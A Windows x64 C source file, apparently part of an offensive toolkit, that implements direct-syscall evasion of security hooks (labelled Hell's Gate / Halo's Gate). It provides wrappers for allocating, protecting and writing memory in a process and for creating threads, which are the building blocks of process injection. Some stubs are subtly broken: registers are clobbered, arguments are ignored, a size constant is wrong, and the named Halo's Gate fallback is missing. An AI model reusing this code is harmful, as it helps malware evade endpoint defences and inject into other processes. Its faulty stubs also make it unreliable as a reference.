/*
 * Evasion: Direct Syscalls (Hell's Gate / Halo's Gate)
 *
 * Executes system calls directly without going through ntdll hooks.
 * Windows only (x64).
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

/* ============================================================================
 * Syscall Number Extraction (Hell's Gate / Halo's Gate)
 * ============================================================================ */

static uint32_t jocky_get_syscall_number(const char* zw_name)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0xFFFFFFFF;

    FARPROC proc = GetProcAddress(hNtdll, zw_name);
    if (!proc) return 0xFFFFFFFF;

    BYTE* func = (BYTE*)proc;

    /* Check for standard Windows 10+ pattern:
     * 4C 8B D1          mov r10, rcx
     * B8 xx xx xx xx    mov eax, syscall_number
     */
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1) {
        if (func[3] == 0xB8) {
            return *(uint32_t*)(func + 4);
        }
    }

    /* Fallback: direct mov eax pattern */
    if (func[0] == 0xB8) {
        return *(uint32_t*)(func + 1);
    }

    return 0xFFFFFFFF;
}

/* ============================================================================
 * Direct Syscall Stub (x64)
 * 
 * mov r10, rcx
 * mov eax, syscall_number
 * syscall
 * ret
 * ============================================================================ */

static const unsigned char syscall_stub[] = {
    0x4C, 0x8B, 0xD1,             /* mov r10, rcx              */
    0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, syscall_number   */
    0x0F, 0x05,                   /* syscall                   */
    0xC3                          /* ret                       */
};

#define SYSCALL_STUB_SIZE 15

static inline void* create_syscall_stub(uint32_t syscall_number)
{
    void* mem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;

    memcpy(mem, syscall_stub, sizeof(syscall_stub));
    *(uint32_t*)((BYTE*)mem + 4) = syscall_number;
    
    /* Flush instruction cache */
    FlushInstructionCache(GetCurrentProcess(), mem, 15);
    
    return mem;
}

/* Direct syscall with up to 4 arguments */
intptr_t jocky_direct_syscall4(uint32_t syscall_number, 
                                uintptr_t a1, uintptr_t a2, 
                                uintptr_t a3, uintptr_t a4)
{
    void* stub = create_syscall_stub(syscall_number);
    if (!stub) return -1;

    typedef intptr_t (*syscall_fn_t)(uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    intptr_t result = ((syscall_fn_t)stub)(a1, a2, a3, a4);
    
    VirtualFree(stub, 0, MEM_RELEASE);
    return result;
}

/* 6-argument version for functions like NtAllocateVirtualMemory */
intptr_t jocky_direct_syscall6(uint32_t syscall_number,
                                uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4,
                                uintptr_t a5, uintptr_t a6)
{
    void* mem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return -1;

    /* x64 syscall convention: rcx, rdx, r8, r9, [rsp+0x28], [rsp+0x30] */
    static const unsigned char stub6[] = {
        0x4C, 0x8B, 0xD1,                 /* mov r10, rcx              */
        0xB8, 0x00, 0x00, 0x00, 0x00,     /* mov eax, syscall_number   */
        0x49, 0x89, 0xE8,                 /* mov r8, rbp (spill 5th)   */
        0x4D, 0x89, 0xE1,                 /* mov r9, rsp (spill 6th)   */
        0x0F, 0x05,                       /* syscall                   */
        0xC3                              /* ret                       */
    };

    memcpy(mem, stub6, sizeof(stub6));
    *(uint32_t*)((BYTE*)mem + 4) = syscall_number;
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stub6));

    typedef intptr_t (*syscall_fn6_t)(uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    intptr_t result = ((syscall_fn6_t)mem)(0,0,0,0,0,0); /* args passed via registers */
    
    VirtualFree(mem, 0, MEM_RELEASE);
    return result;
}

/* Convenience: Get syscall number by name */
uint32_t jocky_get_syscall_num(const char* zw_name)
{
    return jocky_get_syscall_number(zw_name);
}

/* Convenience wrappers for common syscalls */

NTSTATUS jocky_nt_allocate_virtual_memory(HANDLE process, PVOID* base,
                                           ULONG_PTR zero_bits, PSIZE_T size,
                                           ULONG type, ULONG protect)
{
    uint32_t num = jocky_get_syscall_number("NtAllocateVirtualMemory");
    if (num == 0xFFFFFFFF) return STATUS_NOT_IMPLEMENTED;

    void* mem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return STATUS_NO_MEMORY;

    static const unsigned char stub6[] = {
        0x4C, 0x8B, 0xD1,             /* mov r10, rcx */
        0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, num */
        0x49, 0x89, 0xE8,             /* mov r8, rbp */
        0x4D, 0x89, 0xE1,             /* mov r9, rsp */
        0x0F, 0x05,                   /* syscall */
        0xC3                          /* ret */
    };

    memcpy(mem, stub6, sizeof(stub6));
    *(uint32_t*)((BYTE*)mem + 4) = num;
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stub6));

    typedef NTSTATUS (*fn_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS status = ((fn_t)mem)(process, base, zero_bits, size, type, protect);
    
    VirtualFree(mem, 0, MEM_RELEASE);
    return status;
}

NTSTATUS jocky_nt_protect_virtual_memory(HANDLE process, PVOID* base,
                                          PSIZE_T size, ULONG new_protect,
                                          PULONG old_protect)
{
    uint32_t num = jocky_get_syscall_number("NtProtectVirtualMemory");
    if (num == 0xFFFFFFFF) return STATUS_NOT_IMPLEMENTED;

    void* mem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return STATUS_NO_MEMORY;

    static const unsigned char stub5[] = {
        0x4C, 0x8B, 0xD1,             /* mov r10, rcx */
        0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, num */
        0x49, 0x89, 0xE8,             /* mov r8, rbp */
        0x0F, 0x05,                   /* syscall */
        0xC3                          /* ret */
    };

    memcpy(mem, stub5, sizeof(stub5));
    *(uint32_t*)((BYTE*)mem + 4) = num;
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stub5));

    typedef NTSTATUS (*fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    NTSTATUS status = ((fn_t)mem)(process, base, size, new_protect, old_protect);
    
    VirtualFree(mem, 0, MEM_RELEASE);
    return status;
}

NTSTATUS jocky_nt_create_thread(HANDLE* thread_handle, ACCESS_MASK desired_access,
                                 POBJECT_ATTRIBUTES object_attributes, HANDLE process_handle,
                                 PVOID start_routine, PVOID argument,
                                 ULONG create_flags, PULONG thread_id)
{
    uint32_t num = jocky_get_syscall_number("NtCreateThreadEx");
    if (num == 0xFFFFFFFF) return STATUS_NOT_IMPLEMENTED;

    void* mem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return STATUS_NO_MEMORY;

    static const unsigned char stub[] = {
        0x4C, 0x8B, 0xD1,             /* mov r10, rcx */
        0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, num */
        0x49, 0x89, 0xE8,             /* mov r8, rbp */
        0x4D, 0x89, 0xE1,             /* mov r9, rsp */
        0x0F, 0x05,                   /* syscall */
        0xC3                          /* ret */
    };

    memcpy(mem, stub, sizeof(stub));
    *(uint32_t*)((BYTE*)mem + 4) = num;
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stub));

    typedef NTSTATUS (*fn_t)(HANDLE*, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, PULONG);
    NTSTATUS status = ((NTSTATUS(*)(HANDLE*, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, PULONG))mem)(
        thread_handle, desired_access, object_attributes, process_handle,
        start_routine, argument, create_flags, thread_id
    );
    
    VirtualFree(mem, 0, MEM_RELEASE);
    return status;
}

NTSTATUS jocky_nt_write_virtual_memory(HANDLE process, PVOID base, PVOID buffer,
                                        SIZE_T size, PSIZE_T written)
{
    uint32_t num = jocky_get_syscall_number("NtWriteVirtualMemory");
    if (num == 0xFFFFFFFF) return STATUS_NOT_IMPLEMENTED;

    void* mem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return STATUS_NO_MEMORY;

    static const unsigned char stub5[] = {
        0x4C, 0x8B, 0xD1,             /* mov r10, rcx */
        0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, num */
        0x49, 0x89, 0xE8,             /* mov r8, rbp */
        0x0F, 0x05,                   /* syscall */
        0xC3                          /* ret */
    };

    memcpy(mem, stub5, sizeof(stub5));
    *(uint32_t*)((BYTE*)mem + 4) = num;
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stub5));

    typedef NTSTATUS (*fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS status = ((fn_t)mem)(process, base, buffer, size, written);
    
    VirtualFree(mem, 0, MEM_RELEASE);
    return status;
}

#endif /* _WIN32 */
